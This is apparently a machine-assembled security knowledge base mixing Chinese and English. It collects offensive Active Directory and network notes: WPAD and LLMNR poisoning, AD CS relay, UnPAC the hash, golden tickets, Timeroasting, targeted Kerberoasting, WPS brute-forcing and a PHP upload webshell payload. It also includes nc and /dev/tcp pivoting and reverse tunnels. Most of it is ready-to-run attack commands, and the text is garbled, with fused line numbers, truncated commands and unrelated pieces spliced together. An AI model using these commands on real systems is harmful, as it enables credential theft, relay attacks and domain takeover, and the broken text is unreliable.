12webclientservicescanner 'domain.local'/'user':'password'@'machine'netexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav # 2. 侦察 1GetWebDAVStatus.exe 'machine' # 3. Abuse from multicast poisoning 1responder --interface "eth0" -E # 5. Abuse from multicast poisoning 12345# Start smbserver in a first terminal with authentication requiredpython3 smbserver.py $NAME . -smb2support -username notexist -password notexist# Start Responder in a second terminalresponder --interface "eth0" # 6. The WSUS spoofing attack can be conducted as follows Redirect traffic from clients -> legitimate WSUS to clients -> attacker's WSUS In a scenario where the clients and the attacker are on the same subnet, and the update server is on another one, the steps below can be followed. A brute-force attack involves trying all possible combinations until the correct PIN is found. Pixie Dust: This attack exploits a weakness in the generation of WPS encryption keys. It involves exploiting vulnerabilities in certain routers during the creation of WPA/WPA2 encryption keys. PIN Revelation: Certain WPS-enabled routers may reveal information about the validity of the PIN during a connection attempt. This information disclosure can aid an attacker in narrowing down the search space during a brute-force attack. Access Point 枚举: Some routers with WPS may be vulnerable to an attack that allows an attacker to determine which access points are present in a given area. Most WPS attacks mentioned below can be conducted using airgeddon (Bash) or wifite2 (Python). # 命令 / 载荷 / 操作片段 # 1. Monitor mode 1234567891011# view wireless interfaces and check their current mode.iwconfig# disable a network interfaceifconfig "$INTERFACE" down# change the interface mode to monitoriwconfig "$INTERFACE" mode monitor# re-enable your network interface.ifconfig "$INTERFACE" up # 2. Monitor mode 12345678# list all your network interfaces.airmon-ng# stop interfering network processesarimon-ng check kill# start a network interface in monitor modeairmon-ng start "$INTERFACE" # 3. 侦察 1wash -i "$INTERFACE" # 4. PIN Brute-Force 123456789# Use 5GHz 802.11 channels (for both tools): -5# With reaver# Verbosity of output (for reaver): -v -vv -vvvreaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -vv# With bully# Verbosity of output: -v 1 -v 2 -v 3bully "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -S -F -B -v 3 # 5. content: 来源路径： 02-知识点/域与Windows/WPAD spoofing 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # WPAD spoofing 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 WPAD spoofing 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 WPAD spoofing 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：WPAD spoofing、Theory、Practice、through LLMNR, NBT-NS spoofing、through ADIDNS spoofing；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 WPAD spoofing Theory Practice through LLMNR, NBT-NS spoofing through ADIDNS spoofing Pre CVE-2018-8320 Post CVE-2018-8320 through DHCPv6 spoofing # 核心要点 Proxy auth NTLM 认证 can either be forced and relayed with ntlmrelayx by using the --http-port 3128 argument Responder (Python) and Inveigh (Powershell) are great 工具 for name poisoning. In addition to name poisoning, they also have the ability to start servers (listeners) that will capture authentications and echo the NTLM hashes to the attacker. The following command will start LLMNR, NBTS and mDNS spoofing. Name resolution queries for the wpad server will be answered just like any other query. Fake 认证 servers (HTTP/S, SMB, SQL, FTP, IMAP, POP3, DNS, LDAP, ...) will capture NTLM hashes. On machines that are not patched against CVE-2018-8320, there are two ways to 绕过 the GQBL: by registering a wildcard record or by registering a domain alias (DNAME) record, which can be conducted as follows with Powermad (Powershell). On up-to-date machines (i.e. with the MS16-077 security update applied), WPAD can still be abused through ADIDNS spoofing, even if the WPAD record does exist. With DNS poisoning through DHCPv6 spoofing, an attacker can reply to DHCPv6 requests, and then reply to DNS queries. # 命令 / 载荷 / 操作片段 # 1. through LLMNR, NBT-NS spoofing 12responder --interface "eth0" --wpad --ProxyAuthresponder -I "eth0" -wP # 2. through LLMNR, NBT-NS spoofing 1Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y # 3. Pre CVE-2018-8320 12New-ADIDNSNode -Node '*' -Data 'Pentest_IP_Address'New-ADIDNSNode -Node wpad -Type DNAME -Data 'pentester01.TARGETDOMAIN.LOCAL' # 4. Post CVE-2018-8320 1New-ADIDNSNode -Node wpad -Type NS -Data 'pentester01.TARGETDOMAIN.LOCAL' # 5. Post CVE-2018-8320 1dnschef --fakeip 'Pentest_IP_Address' --interface 'Pentest_IP_Address' --port 53 --logfile dnschef.log # 工具与参考入口 ntlmrelayx Responder Inveigh crack.sh [it can be edited](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc995158(v=technet.10) [implementing WPAD](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc995261(v=technet.10) CVE-2018-8320 Powermad dnschef mitm6 https://blog.netspi.com/adidns-revisited/ https://www.fox-it.com/en/news/blog/mitm6-compromising-ipv4-networks-via-ipv6/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/Unsigned endpoints 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Unsigned endpoints 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Unsigned endpoints 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Unsigned endpoints 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Unsigned endpoints、Theory、Practice、Web endpoint (ESC8)、RPC endpoint (ESC11)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Unsigned endpoints Theory Practice Web endpoint (ESC8) RPC endpoint (ESC11) # 核心要点 In their research papers, Will Schroeder and Lee Christensen found a domain escalation vector based on web endpoints vulnerable to NTLM 中继 attacks. The escalation vector was dubbed ESC8. AD CS supports several HTTP-based enrollment methods via additional server roles that administrators can optionally install [(The certificate enrollment web interface, Certificate Enrollment Service (CES), Network Device Enrollment Service (NDES)).] Following this, Sylvain Heiniger from Compass Security has found a similar 漏洞 on the AD CS RPC enrollment endpoint. As described in his article, each RPC interface checks the NTLM signature independently. This allows for 横向移动，account 持久化，and in some cases 权限提升 if the relayed user had powerful privileges (e.g., domain controllers or Exchange servers, domain admins etc.). From UNIX-like systems, Impacket's ntlmrelayx (Python) can be used to conduct the ESC8 escalation scenario. The certificate template flag (i.e. --template) can either be left blank (defaults to Machine or User whether relayed account name ends with $) or chosen among the certificate templates that fill the requirements. # 命令 / 载荷 / 操作片段 # 1. Web endpoint (ESC8) 1ntlmrelayx -t http://$PKI.domain.local/certsrv/certfnsh.asp --adcs --template "Template name" # 2. Web endpoint (ESC8) 1234# find ESC8-vulnerable CAscertipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep -B20 ESC8# find and look through enabled templates for ones that could be used for authenticationcertipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout -enabled # 3. Web endpoint (ESC8) 1Certify.exe cas # 4. RPC endpoint (ESC11) 1ntlmrelayx -t rpc://$PKI.domain.local -rpc-mode ICPR -icpr-ca-name $CA_NAME -smb2support --template "Template name" # 5. RPC endpoint (ESC11) 1234# find ESC11-vulnerable CAscertipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep -B20 ESC11# find and look through enabled templates for ones that could be used for authenticationcertipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout -enabled # 工具与参考入口 their research papers Will Schroeder Lee Christensen ESC8 specterops.io Sylvain Heiniger his article Microsoft documentation Impacket ntlmrelayx Certipy Certify https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Testers need to find forms that allow users to 上传 content. On a server using PHP, the following test can be operated. 上传 a PHP file with the following content: <?php phpinfo (); ?> Assert that the phpinfo() function is executed Repeat steps 1 to 3 but with a PHP file with a code execution 载荷: <?php system ('whoami'); ?> As command execution functions can be filtered (system, passthru, exec, shell exec), the phpinfo testing phase is required to assert that arbitrary PHP code is included and interpreted. using a valid but lesser known extension to 绕过 blacklists (let's say the .php extension is blacklisted, what about .php3, .php4, .php5, .php6, .pht, .phpt and .phtml ?) alternating upper and lower case letters to 绕过 case sensitive rules (.pHp, .aSp) Content type (MIME type): the media type (sent as "Content-type: MIME type") identifier is sent along with the name and content of the uploaded file. content: 来源路径： 02-知识点/域与Windows/UnPAC the 哈希.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # UnPAC the 哈希 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 UnPAC the 哈希 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 UnPAC the 哈希 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice # 核心要点 The NTLM keys will then be recoverable after a TGS-REQ through U2U, combined with S4U2self, which is a Service Ticket request made to the KDC where the user asks to authenticate to itself (i.e. S4U2self + User-to-User 认证). The following protocol diagram details how UnPAC-the - 哈希 works. It allows attackers that know a user's private key, or attackers able to conduct Shadow 凭据 or Golden certificate attacks, to recover the user's LM and NT hashes. UnPAC the 哈希 flow From UNIX-like systems, this attack can be conducted with PKINITtools (Python). Once the TGT is obtained, and the session key extracted (printed by gettgtpkinit.py), the getnthash.py script can be used to recover the NT 哈希. The NT 哈希 can be used for 哈希传递，白银票据，or Kerberos delegations abuse. # 命令 / 载荷 / 操作片段 # 1. Practice 1gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE" # 2. Practice 12export KRB5CCNAME="TGT_CCACHE_FILE"getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME' # 3. Practice 1Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"[REDACTED_SECRET]" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show # 工具与参考入口 PKINITtools Rubeus https://shenaniganslabs.io/2021/06/21/Shadow - 凭据.html # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Even if the user is in the Administrators group, these changes force the user to re-enter their account 凭据 in order to perform administrative actions. This is useful to get reverse shells from internal hosts through a DMZ to your host: Security – Terrapin Attack (CVE-2023-48795) Admin privileges are not required to create reverse port forwards on high ports. You need to 上传 a web file tunnel: ashx|aspx|js|jsp|php|php|jsp You can 下载 it from the releases page of https://github.com/jpillora/chisel\ Connect via RDP and 上传 & execute in the victim machine the SocksOverRDP-Server.exe binary: OpenVPN can also 绕过 it, setting these options in the configuration file: 下载 it from here**.** Debug telemetry – optional logging records source IP, destination IP, and total forwarded bytes for each pairing. Investigators used those breadcrumbs to rebuild the ShadowPad mesh spanning multiple victims. # 命令 / 载荷 / 操作片段 # 1. Bash 12345678910111213# On the jump server connect the port 3333 to the 5985mknod backpipe p;nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe# On InternalA accessible from Jump and can access InternalB## Expose port 3333 and connect it to the winrm port of InternalBexec 3<>/dev/tcp/internalB/5985exec 4<>/dev/tcp/Jump/3333cat <&3 >&4 &cat <&4 >&3 &# From the host, you can now access InternalB from the Jump serverevil-winrm -u username -i Jump # 2. SSH 1ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X # 3. Local Port2Port 1ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere # 4. Local Port2Port 1ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere # 5. Port2Port 123ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f] #This way the terminal is still in your host#Examplesudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised> # 6. Port2hostnet (proxychains) 1ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy) # 7. Reverse Port Forwarding 123456ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000# Note that port 443 must be open# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems# and change the line "GatewayPorts no" to "GatewayPorts yes"# to be able to make ssh listen in non internal interfaces in the victim (443 in this case) # 8. VPN-Tunnel 12345ssh root@server -w any:any #This will create Tun interfaces in both devicesip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IPip link set tun0 up #Activate the client side network interfaceip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IPip link set tun0 up #Activate the server side network interface # 9. VPN-Tunnel 12echo 1 > /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE # 10. VPN-Tunnel 1route add -net 10.0.0.0/16 gw 1.1.1.1 # 11. SSHUTTLE 12pip install sshuttlesshuttle -r user@host 10.10.10.10/24 # 12. SSHUTTLE 12sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'# -D : Daemon mode # 13. Port2Port 12# Inside a meterpreter sessionportfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host> # 14. SOCKS 12345background# meterpreter sessionroute add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)use auxiliary/server/socks_proxyrun #Proxy port 1080 by defaultecho "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains # 15. SOCKS 12345678910background #meterpreter sessionuse post/multi/manage/autorouteset SESSION <session_n>set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0set NETMASK <Netmask>runuse auxiliary/server/socks_proxyset VERSI

content: 来源路径： 02-知识点/域与Windows/Trusts 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Trusts 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Trusts 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Trusts 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Trusts、Theory、Forest, domains & trusts、Global Catalog、Trust types；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Trusts Theory Forest, domains & trusts Global Catalog Trust types Trust flavor Transitivity SID filtering SID history 认证 level TGT delegation Kerberos 认证 NTLM 认证 MIM PAM & Bastion (Red Forests) Practice 枚举 netdom PowerView # 核心要点 认证 (provided 授权 for all groups that a user account belongs to, which is included when an access 令牌 is generated) MIT: a trust with a non-Windows Kerberos realm, typically used for interoperability with UNIX-based systems running MIT Kerberos. AAD: the trusted domain is in Azure Active Directory 域. Realm: exists between a Windows domain and a non-Windows domain, such as a Kerberos realm. It allows users in the Windows domain to access resources in the non-Windows domain. If the TRUST ATTRIBUTE TREAT AS EXTERNAL (0x00000040) flag is set, then inter-forest ticket can be forged, spoofing an RID >= 1000. Of course, this doesn't apply if TAQD (TRUST ATTRIBUTE QUARANTINED DOMAIN) is set. SID filtering is not unique to trusts. It occurs "whenever a service ticket is accepted" either by the KDC or by a local service and behaves differently depending on the contect in which the ticket was produced. Trust type: Parent-Child, Tree-Root, Shortcut (a.k.a. "Cross-Link"), Forest, External, or Realm (a.k.a. "Kerberos"). msDS-ShadowPrincipalSid: the SID of the principal (from the Production Forest) whose privileges are assigned to the shadow security principal. If the attacker is moving across an intra-forest trust, it would allow to compromise the forest root, and by extension, all the forest, since Enterprise Admins can access all domains' domain controllers as admin (because the security boundary is the forest, not the domain). If the attacker is moving across an inter-forest trust, it could allow to compromise the trusting domain, depending on how SID filtering is configured, and if there are some groups that have sufficient permissions. # 命令 / 载荷 / 操作片段 # 1. MIM PAM & Bastion (Red Forests) 123456789101112131415Bastion ROOT (DC=BASTION,DC=LOCAL)├── Configuration Naming Context (CN=Configuration)│ ├── Services (CN=Services)│ │ ├── Default Shadow Principal Container (CN=Shadow Principal Configuration)│ │ │ ├── Shadow Principal object│ │ │ │ ├── name: prodForest-ShadowEntrepriseAdmin│ │ │ │ ├── member: { BASTION/bobby, BASTION/jason } (Users in Bastion Forest)│ │ │ │ ├── msDS-ShadowPrincipalSid: S-1-5-21-[...]-519 (Entreprise Admins @ PRODUCTION.LOCAL)│ │ │ │ ├── ...│ │ │ ├── Shadow Principal object│ │ │ │ ├── name: prodForest-ShadowDomainAdmin│ │ │ │ ├── member: { BASTION/max, BASTION/jason } (Users in Bastion Forest)│ │ │ │ ├── msDS-ShadowPrincipalSid: S-1-5-21-[...]-512 (Domain Admins @ PRODUCTION.LOCAL)│ │ │ │ ├── ...│ │ ├── [...] # 2. 枚举 1234567891011# ldeep supports cleartext, pass-the-hash, pass-the-ticket, etc.ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" trusts# ldapdomaindump will store HTML, JSON and Greppable outputldapdomaindump --user 'DOMAIN\USER' --password "$PASSWORD" --outdir "ldapdomaindump" "$DC_HOST"# ldapsearch-adldapsearch-ad --server "$DC_HOST" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" --type trusts# ldapsearchldapsearch -h ldap://"$DC_IP" -b "CN=SYSTEM,DC=$DOMAIN" "(objectclass=trustedDomain)" # 3. netdom 1netdom trust /domain:DOMAIN.LOCAL # 4. PowerView 1Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)" # 5. Referral ticket 12345# 1. forge the referral ticketticketer.py -nthash "inter-realm key" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" -spn "krbtgt/target_domain_fqdn" "someusername"# 2. use it to request a service ticketKRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "target_domain_fqdn/someusername@target_domain_fqdn" # 6. Referral ticket 1# TODO # 7. 黄金票据 12345# Generate golden ticket with extra SIDticketer.py -nthash "compromised_domain_krbtgt_NT_hash" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" "someusername"#

content: 来源路径： 02-知识点/域与Windows/Timeroasting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Timeroasting 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Timeroasting 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Timeroasting 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Timeroasting、Theory、Practice、Unauthenticated Timeroasting、Authenticated Timeroasting；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Timeroasting Theory Practice Unauthenticated Timeroasting Authenticated Timeroasting Cracking SNTP hashes How to Attack Practical attack (unauth) with NetExec + Hashcat # 核心要点 Timeroasting is an attack technique that abuses Microsoft's proprietary NTP extension to extract 密码 - equivalent hashes for computer and trust accounts from domain controllers without requiring 认证. These hashes can subsequently be cracked offline. 认证 to the domain controller is not required to make NTP requests. An attacker can query any RID, and the server will respond with a MAC computed using that account's 密码 哈希. While this presents no security risk when computer accounts use strong, randomly generated passwords, many Active Directory 域 environments contain accounts with weak or default passwords, particularly those created through legacy methods or manual provisioning processes. Timeroasting can be performed in two contexts: unauthenticated (for initial access) and authenticated (for 横向移动 or 权限提升). Each approach offers distinct advantages. Unlike Kerberoasting 服务票据离线爆破，unauthenticated Timeroasting can be carried out without any prior foothold (no valid domain 凭据 required). This approach is particularly valuable for initial access scenarios where no domain 凭据 are available. However, it only returns RIDs rather than computer names, requiring additional steps to map hashes to specific accounts. Automatic RID-to-hostname mapping: When authenticated, RIDs can be automatically resolved to their corresponding computer account names through Active Directory 域 queries, eliminating the need for manual correlation or SMB NULL session 枚举. The 密码学 - checksum is MD5-based (see 3.2.5.1.1) and can be cracked offline, enabling the roasting attack. NetExec can enumerate and collect MS-SNTP MACs for computer RIDs unauthenticated and print sntp−mssntp-mssntp−ms hashes ready for cracking: Crack offline with Hashcat mode 31300 (MS-SNTP MAC): The recovered cleartext corresponds to a computer account 密码. Try it directly as the machine account using Kerberos (-k) when NTLM is disabled: Ensure accurate time sync before Kerberos: sudo ntpdate <dc fqdn> If needed, generate krb5.conf for the AD realm: netexec smb <dc fqdn> --generate-krb5-file krb5.conf Map RIDs to principals later via LDAP/BloodHound 图分析 once you have any authenticated foothold. # 命令 / 载荷 / 操作片段 # 1. Unauthenticated Timeroasting 1python3 timeroast.py "$DC_IP" # 2. Unauthenticated Timeroasting 1netexec smb "$DC_IP" -M timeroast # 3. Unauthenticated Timeroasting 1. .\timeroast.ps1 # 4. Authenticated Timeroasting 12345# Default executionInvoke-AuthenticatedTimeRoast -DomainController $DC_IP# Generate wordlist based on computer namesInvoke-AuthenticatedTimeRoast -DomainController $DC_IP -GenerateWordlist # 5. Below is the attack workflow (step 1 & 2 can be switched if need be): An example of DRSUAPI traffic for a successful DC Shadow attack It is important to note that this technique can be used as a "meta" one, in the sense that it permits to use other 持久化 techniques, such as SID history , Delegation to KRBTGT and even DACL abuse. For instance, a DC Shadow attack can be conducted to register a controlled workstation as a domain controller, and then use that to push changes to the domain that would expose it to DACL abuse. Every async event write stores a single DWORD = InitContext (attacker-controlled in the subsequent Initialize request) to the opened handle, yielding write-what/write-where (4 bytes). For each DWORD to write, execute this RPC sequence against ClientRequest: GetAsyncEvents (Req Func 0): dequeue/completes the write. The file must already exist because OPEN EXISTING is used. Common NETWORK SERVICE-writable candidates: C:\Windows\System32\catroot2\dberr.txt, C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp\MpCmdRun.log, ...\MpSigStub.log. Grant yourself Telephony “admin”: target C:\Windows\TAPI\tsec.ini and append [TapiAdministrators]\r\n<DOMAIN\user>=1 using the 4-byte writes above. Start a new session (ClientAttach) so the service re-reads the INI and sets ptClient->dwFlags |= 9 for your account. Works with UNC paths to a real Windows SMB share; some attacker SMB servers fail with ERROR SMB GUEST LOGON BLOCKED. Alternative: slowly drop a local DLL using the same 4-byte write primitive, then load it. # 命令 / 载荷 / 操作片段 # 1. Primitive: Mailslot Path Confusion → Arbitrary DWORD Write 1CreateFileW(pszDomainUser, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); # 工具与参考入口 Who’s on the line? A member of the Account Operator group usually has those permissions. The attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting 服务票据离线爆破. This technique is called Targeted Kerberoasting 服务票据离线爆破. From Windows machines, this can be achieved with Set-DomainObject and Get-DomainSPNTicket (PowerView module). Note: the README contains the 方法论 to request a certificate using certreq from Windows (with a 密码，or an NTHash). Once the Kerberoasting 服务票据离线爆破 哈希 is obtained, it can possibly be cracked to recover the account's 密码 if the 密码 used is weak enough. # 命令 / 载荷 / 操作片段 # 1. Targeted Kerberoasting 服务票据离线爆破 1targetedKerberoast.py -v -d "$DC_HOST" -u "$USER" -p "$PASSWORD" # 2. Targeted Kerberoasting 服务票据离线爆破 1nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting kerberoastables.txt --targeted-kerberoast "$TARGET" # 3. Targeted Kerberoasting 服务票据离线爆破 12345678910111213# Make sur that the target account has no SPNGet-DomainUser 'victimuser' | Select serviceprincipalname# Set the SPNSet-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}# Obtain a kerberoast hash$User = Get-DomainUser 'victimuser'$User | Get-DomainSPNTicket | fl# Clear the SPNs of the target account$User | Select serviceprincipalnameSet-DomainObject -Identity victimuser -Clear serviceprincipalname # 4. Targeted Kerberoasting 服务票据离线爆破 1234567891011# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Add the 'nonexistent/BLAHBLAH' value into the target's serviceprincipalname attribute (method 1)Invoke-PassTheCert -Action 'AddValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=VICTIM VU. USER,CN=Users,DC=X' -Attribute 'serviceprincipalname' -Value 'nonexistent/BLAHBLAH'# Add the 'nonexistent/BLAHBLAH' value into the target's serviceprincipalname attribute (method 2, same as method 1)Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Kerberoasting' -Target 'CN=VICTIM VU. USER,CN=Users,DC=X' -SPN 'nonexistent/BLAHBLAH' # 工具与参考入口 targetedKerberoast.py NetExec Set-DomainObject Get-DomainSPNTicket PowerView Invoke-PassTheCert PassTheCert README certreq https://www.netexec.wiki/ldap-protocol/Kerberoasting 服务票据离线爆破 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

There are many different techniques to find subdomains that can be divided in two main categories. Attackers don't connect directly to the target systems and stay under the radar. Certificate Transparency Attackers obtain information directly from the target systems. The results may be more useful but can raise some alerts on the defenders side. Detailing every technique mentioned above would be a duplicate to other blogposts that already do (cf. Resources). On Google, the site: operator can be used to find subdomains. The minus (-) operator can also be used to exclude subdomains that are already known (e.g. site:*.thehacker.recipes -www). ⚠️ Content of this page has been moved to InternalAllTheThings/redteam/access/web-attack-surface Enumerate Subdomains Certificate Transparency Logs # 命令 / 载荷 / 操作片段 # 1. In order to choose what website to show for what domain, many use what is called "virtual hosting". Virtual hosting can be based on a name, an IP, or a port (read more). content: 来源路径： 02-知识点/域与Windows/Stealing Windows 凭据.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Stealing Windows 凭据 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Stealing Windows 凭据 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Stealing Windows 凭据 放进 AD/Windows 